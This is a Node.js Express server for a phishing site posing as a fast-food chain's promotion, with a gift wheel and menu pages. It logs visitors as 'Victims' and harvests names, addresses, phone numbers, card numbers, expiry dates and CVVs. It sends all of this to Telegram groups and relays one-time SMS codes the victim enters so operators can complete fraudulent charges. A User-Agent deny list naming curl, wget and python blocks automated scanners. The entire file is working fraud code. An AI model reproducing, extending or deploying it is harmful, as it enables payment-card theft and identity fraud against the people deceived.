const express = require("express");
const useragent = require("express-useragent");
const bodyParser = require("body-parser");
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');
const helmet = require('helmet');
const { Op } = require("sequelize");
const path = require("path");
const { Telegram, Markup } = require("telegraf");
const binInfoEdit = require("./handlers/functions/binInfoEdit");
const withOutWriter = require("./handlers/functions/withOutWriter");
const reqInfo = require("./handlers/functions/reqInfo");
const vbivButtons = require("./handlers/functions/vbivButtons");
const config = require("./config/config");
const {
    Products,
    sequelize,
    Carts,
    Victims,
    Logs
} = require("./config/database");
const bot = new Telegram(config.bot.token);
const fs = require("fs");

const logsGroupId = config.bot.logsGroupId;
const loggingGroupId = config.bot.loggingGroupId;

const app = express();

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "pages"));

// Безопасность и защита от ботов
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://cdn-icons-png.flaticon.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn-icons-png.flaticon.com"],
            imgSrc: ["'self'", "data:", "https:", "http:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    crossOriginEmbedderPolicy: false
}));

// Rate limiting - ограничение количества запросов
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 минут
    max: 100, // максимум 100 запросов с одного IP за 15 минут
    message: {
        error: 'Too many requests from this IP, please try again later.',
        retryAfter: '15 minutes'
    },
    standardHeaders: true,
    legacyHeaders: false,
});

// Slow down - замедление при превышении лимита
const speedLimiter = slowDown({
    windowMs: 15 * 60 * 1000, // 15 минут
    delayAfter: 50, // начать замедление после 50 запросов
    delayMs: 500, // добавить 500ms задержки на каждый запрос после лимита
    maxDelayMs: 20000, // максимальная задержка 20 секунд
});

// Защита от ботов - проверка User-Agent
const botProtection = (req, res, next) => {
    const userAgent = req.get('User-Agent') || '';
    const suspiciousPatterns = [
        /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
        /python/i, /java/i, /php/i, /go-http/i, /okhttp/i, /axios/i,
        /postman/i, /insomnia/i, /httpie/i, /requests/i
    ];
    
    // Проверяем на подозрительные User-Agent
    const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(userAgent));
    
    if (isSuspicious) {
        console.log(`🚫 Blocked suspicious request from IP: ${req.ip}, User-Agent: ${userAgent}`);
        return res.status(403).json({ 
            error: 'Access denied',
            message: 'Automated requests are not allowed'
        });
    }
    
    // Проверяем на отсутствие User-Agent (часто боты)
    if (!userAgent || userAgent.length < 10) {
        console.log(`🚫 Blocked request without proper User-Agent from IP: ${req.ip}`);
        return res.status(403).json({ 
            error: 'Access denied',
            message: 'Valid User-Agent required'
        });
    }
    
    next();
};

// Middleware для проверки верификации человека
const requireHumanVerification = (req, res, next) => {
    const humanVerified = req.cookies.humanVerified;
    
    if (!humanVerified) {
        console.log(`🚫 Unverified request blocked from IP: ${req.ip}`);
        return res.status(403).json({ 
            error: 'Human verification required',
            message: 'Please complete verification to access this resource'
        });
    }
    
    next();
};

// Применяем защиту
app.use(limiter);
app.use(speedLimiter);
app.use(botProtection);

app.use(useragent.express());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
app.use(cookieParser());

// Обработка ошибок
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

sequelize.sync()
    .then(() => {
        console.log('Миграции успешно выполнены!');
    })
    .catch((error) => {
        console.error('Ошибка при выполнении миграций:', error);
    });


async function sendNewVisitorMessage(req) {
    return `🌐 Новый посетитель на сайте!
    
${await reqInfo(req)}`;
}

async function sendNewLogMessage(cardInfo) {
    return `<b>💳 Новый лог #id${cardInfo.id}</b>
💰 Стоимость: <b>${cardInfo.price} THB</b>
${await binInfoEdit(cardInfo.cardNumber.replace(/\s/g, ""))}
Номер: <code>${cardInfo.cardNumber.replaceAll(' ', '')}</code>
💳 Номер: <b>${cardInfo.cardNumber}</b>`;
}

// Healthcheck endpoint for Railway
app.get("/health", (req, res) => {
    res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.get("/", async (req, res) => {
    return res.redirect('/gift');
});

app.get("/gift", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
        
        // Отправляем уведомление о новом посетителе
        if(created) {
            try {
                await bot.sendMessage(loggingGroupId, await sendNewVisitorMessage(req), {
                    parse_mode: "HTML"
                });
            } catch (error) {
                console.error('Ошибка при отправке уведомления о новом посетителе:', error);
            }
        }
    }

    if (victim.discount === 0) {
        return res.render("fortuna", {victim});
    }

    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

    res.render("index", {cartsCount});
});

app.get("/participating-stores", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("participating-stores");
});

app.get("/terms-conditions", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("terms-conditions");
});

app.get("/privacy-notice", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("privacy-notice");
});

app.get("/cookie-policy", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("cookie-policy");
});

app.get("/careers", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("careers");
});

app.get("/bookings", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("bookings");
});

app.get("/feedback", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("feedback");
});

app.get("/locations", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("locations");
});

app.get("/our-app", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("our-app");
});

app.get("/new-whopper", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("new-whopper");
});

app.get("/covid-19", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("covid-19");
});

app.get("/our-menu", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });
    res.render("our-menu", {cartsCount});
});

app.get("/plant-based-kings", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("plant-based-kings");
});

app.get("/menu/:product", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }

    if (!req.params.product) {
        return res.render("404");
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

    const viewPath = path.join(__dirname, 'pages', 'menu', `${req.params.product}.ejs`);
    fs.access(viewPath, fs.constants.F_OK, (err) => {
        if (err) {
            return res.render("404");
        }

        res.render(`menu/${req.params.product}`, {cartsCount});
    });
});

app.get("/product/:product", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }

    if (!req.params.product) {
        return res.render("404");
    }
    const product = await Products.findOne({
       where: {
           tag: req.params.product
       }
    });

    if (!product) {
        return res.render("404");
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

     return res.render(`product`, {product, victim, cartsCount});
});


app.get("/cart", async (req, res) => {
    try {
        let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
        const victimId = req.cookies.victimId;
        const [victim, created] = await Victims.findOrCreate({
            where: {
                [Op.or]: [
                    { id: victimId != undefined ? victimId : null },
                    {
                        ip: ipInfo
                    }
                ]
            },
            defaults: {
                ip: ipInfo
            },
        });

        if(created || victimId == undefined){
            await res.cookie('victimId', victim.id);
        }
        const cartItems = await Carts.findAll({
            where: {
                victimId: victim.id
            }
        });

        if (!cartItems || cartItems.length === 0) {
            return res.render("cart", { cartItems: [], totalPrice: 0, victim  });
        }


        const groupedCart = {};
        cartItems.forEach(item => {
            if (groupedCart[item.title]) {
                groupedCart[item.title].quantity++;
                groupedCart[item.title].totalPrice += item.price;
            } else {
                groupedCart[item.title] = {
                    title: item.title,
                    price: item.price,
                    quantity: 1,
                    totalPrice: item.price,
                };
            }
        });


        const cart = Object.values(groupedCart);


        let totalPrice = 0;
        cart.forEach(item => {
            totalPrice += item.totalPrice;
        });

        return res.render("cart", { cartItems: cart, totalPrice: totalPrice, victim });

    } catch (error) {
        console.error("Ошибка при получении корзины:", error);
        return res.status(500).send("Ошибка сервера"); // Или редирект на страницу ошибки
    }
});

app.get("/checkout/:price", async (req, res) => {
    if (!req.params.price || isNaN(req.params.price)) {
        return res.render("404");
    }

    await bot.sendMessage(loggingGroupId, `🔥 Переход на ввод данных!
    
${await reqInfo(req)}`, {
        parse_mode: "HTML"
    });

    return res.render(`checkout`, {price: req.params.price});

});

app.post('/cart/add', async (req, res) => {
    try {
        const { price, title, victimId } = req.body;
        if (!title || !price || !victimId) {
            console.log(req.body)
            return res.sendStatus(404);
        }

        const newCartItem = await Carts.create({
            title: title,
            price: price,
            victimId: victimId
        });

        const cartsCount = await Carts.count({
            where: {
                victimId: victimId
            }
        });

        return res.json({
            cartsCount
        });
    } catch (error) {
        console.log(error);
        return res.sendStatus(404);
    }
});

app.delete('/cart/remove', async (req, res) => {
    try {
        const { title, victimId } = req.body;

        if (!title || !victimId) {
            return res.sendStatus(404);
        }
        
        const deletedCount = await Carts.destroy({
            where: {
                title: title,
                victimId: victimId
            }
        });

        res.json({ message: `Удалено ${deletedCount} товаров с названием "${title}" из корзины.` });

    } catch (error) {
        return res.sendStatus(404);
    }
});

app.post('/send-fullz', async (req, res) => {
    try {
        const { title, fullName, address, phoneNumber } = req.body;

        if (!title || !fullName || !address || !phoneNumber) {
            return res.sendStatus(404);
        }

        await bot.sendMessage(loggingGroupId, `🪪 Получены данные!
        
Имя: ${title} ${fullName}
Адресс: ${address}
Номер: ${phoneNumber}

${await reqInfo(req)}`, {
            parse_mode: "HTML"
        });

        res.json({ message: `Success` });

    } catch (error) {
        return res.sendStatus(404);
    }
});

app.post("/api/sendLog", requireHumanVerification, async (req, res) => {
    try {
        if(!req.body.price || !req.body.cardNumber || !req.body.exp || !req.body.cvv) {
            return res.sendStatus(404);
        }

        const cardInfo = await Logs.create({
            cardNumber: req.body.cardNumber,
            cardExp: req.body.exp,
            cardCvv: req.body.cvv,
            price: parseFloat(req.body.price)
        });


        const msg2 = await bot.sendMessage(
            logsGroupId,
            await sendNewLogMessage(cardInfo),
            {
                parse_mode: "HTML",
                reply_markup: await withOutWriter(cardInfo)
            }
        );



        await cardInfo.update({ messageId: msg2.message_id });

        return res.json({ id: cardInfo.id });
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.post("/api/getStatus", async (req, res) => {
    try {
        const log = await Logs.findOne({
            where: {
                id: req.body.id,
            },
        });
        if (!log) return res.sendStatus(404);

        if(!log.online) {
            await log.update({online: true})
        }
        return res.json({
            method: log.status,
            id: log.id,
            type: log.type,
            error: log.error,
        });
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.get("/get/discount", async (req, res) => {
    try {
        let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
        const victimId = req.cookies.victimId;
        const [victim, created] = await Victims.findOrCreate({
            where: {
                [Op.or]: [
                    { id: victimId != undefined ? victimId : null },
                    {
                        ip: ipInfo
                    }
                ]
            },
            defaults: {
                ip: ipInfo
            },
        });

        if(created || victimId == undefined){
            await res.cookie('victimId', victim.id);
        }

        await victim.update({
            discount: 50
        })

        return res.redirect('/gift');
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.post('/sendValue', async (req, res) => {
    const log = await Logs.findOne({
        where: {
            id: req.body.id,
        },
    });

    if (!log) return res.sendStatus(404);

    let type = {
        sms: "📩 [ ПОЛУЧЕН КОД ]",
        balance: "📩 [ ПОЛУЧЕН БАЛАНС ]",
        custom: "⌨️ [ МАМОНТ ВВЕЛ ДАННЫЕ ]"
    };

    await log.update({
        status: null
    });

    if (log.writerId) {
        await bot.sendMessage(log.writerId, `<b>${type[req.body.type]}</b>
🦣 ID лога: #id${log.id}
${req.body.type === 'custom' ? `\n❔ Вопрос: ${log.error}` : ''}
🔑 <code>${req.body.value}</code>`, {
            parse_mode: "HTML",
            reply_to_message_id: log.writerMsgId
        });
        await bot.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId, await vbivButtons(log)

        ).catch((err) => err);
    } else {
        await bot.sendMessage(logsGroupId, `<b>${type[req.body.type]}</b>
🦣 ID лога: #id${log.id}
${req.body.type === 'custom' ? `\n❔ Вопрос: ${log.error}` : ''}
🔑 <code>${req.body.value}</code>`, {
            parse_mode: "HTML",
            reply_to_message_id: log.messageId
        });
    }

    return res.sendStatus(200);
});

// API endpoint для верификации человека (защита от ботов)
app.post('/api/verify-human', async (req, res) => {
    try {
        const { token, timestamp, userAgent, language, platform, screenResolution, timezone } = req.body;
        const sessionToken = req.headers['x-session-token'];
        
        // Проверяем что токены совпадают
        if (!token || !sessionToken || token !== sessionToken) {
            return res.status(400).json({ error: 'Invalid token' });
        }
        
        // Проверяем что запрос не слишком старый (не более 5 минут)
        const now = Date.now();
        if (now - timestamp > 5 * 60 * 1000) {
            return res.status(400).json({ error: 'Request too old' });
        }
        
        // Проверяем User-Agent на подозрительные паттерны
        const suspiciousPatterns = [
            /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
            /python/i, /java/i, /php/i, /go-http/i, /okhttp/i, /axios/i,
            /postman/i, /insomnia/i, /httpie/i, /requests/i
        ];
        
        const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(userAgent));
        if (isSuspicious) {
            console.log(`🚫 Blocked suspicious verification from IP: ${req.ip}, User-Agent: ${userAgent}`);
            return res.status(403).json({ error: 'Suspicious request' });
        }
        
        // Логируем успешную верификацию
        console.log(`✅ Human verified from IP: ${req.ip}, Token: ${token.substring(0, 8)}...`);
        
        // Сохраняем информацию о верификации в cookie
        res.cookie('humanVerified', 'true', { 
            maxAge: 30 * 60 * 1000, // 30 минут
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production'
        });
        
        res.json({ 
            success: true, 
            message: 'Human verified',
            verifiedAt: now
        });
        
    } catch (error) {
        console.error('Error in verify-human:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get("*", async (req, res) => {
    return res.render("404");
});


const PORT = process.env.PORT || 80;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app;
